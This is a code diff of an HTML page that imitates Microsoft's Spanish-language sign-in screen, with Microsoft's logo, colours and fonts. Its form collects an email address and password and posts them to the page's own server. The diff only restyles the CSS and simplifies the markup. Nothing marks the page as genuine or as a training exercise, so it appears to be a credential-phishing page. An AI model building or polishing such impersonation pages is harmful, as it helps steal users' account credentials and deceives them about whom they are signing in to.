@@ -5,29 +5,26 @@
   <title>Iniciar sesión - Microsoft</title>
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
-    body { font-family: 'Segoe UI', sans-serif; background:#f3f2f1; display:flex; justify-content:center; align-items:center; min-height:100vh; }
+    body { font-family:'Segoe UI',sans-serif; background:#f3f2f1; display:flex; justify-content:center; align-items:center; min-height:100vh; }
     .card { background:white; padding:44px; width:440px; border-radius:2px; box-shadow:0 2px 6px rgba(0,0,0,0.2); }
-    .logo { margin-bottom:16px; }
-    h1 { font-size:24px; font-weight:600; margin-bottom:16px; color:#1b1b1b; }
-    p { font-size:13px; color:#333; margin-bottom:24px; }
-    input { width:100%; border:1px solid #666; padding:6px 10px; font-size:15px; height:36px; margin-bottom:16px; outline:none; }
-    input:focus { border-color:#0078d4; border-width:2px; }
-    .btn { background:#0078d4; color:white; border:none; padding:0 16px; height:36px; font-size:15px; cursor:pointer; width:100%; }
-    .btn:hover { background:#106ebe; }
+    img { margin-bottom:16px; }
+    h1 { font-size:24px; font-weight:600; margin-bottom:24px; color:#1b1b1b; }
+    input[type=email], input[type=password] { width:100%; border:1px solid #666; padding:6px 10px; font-size:15px; height:36px; margin-bottom:16px; outline:none; display:block; }
+    input[type=email]:focus, input[type=password]:focus { border-color:#0078d4; border-width:2px; }
+    input[type=submit] { background:#0078d4; color:white; border:none; padding:0 16px; height:36px; font-size:15px; cursor:pointer; width:100%; }
+    input[type=submit]:hover { background:#106ebe; }
     .links { margin-top:16px; font-size:13px; }
     .links a { color:#0078d4; text-decoration:none; display:block; margin-bottom:8px; }
   </style>
 </head>
 <body>
   <div class="card">
-    <div class="logo">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/120px-Microsoft_logo.svg.png" width="108" alt="Microsoft">
-    </div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/120px-Microsoft_logo.svg.png" width="108" alt="Microsoft">
     <h1>Iniciar sesión</h1>
     <form method="POST">
       <input type="email" name="email" placeholder="Correo electrónico" required>
       <input type="password" name="password" placeholder="Contraseña" required>
-      <input type="submit" class="btn" value="Siguiente">
+      <input type="submit" value="Siguiente">
     </form>
     <div class="links">
       <a href="#">¿No tienes cuenta? Créala</a>
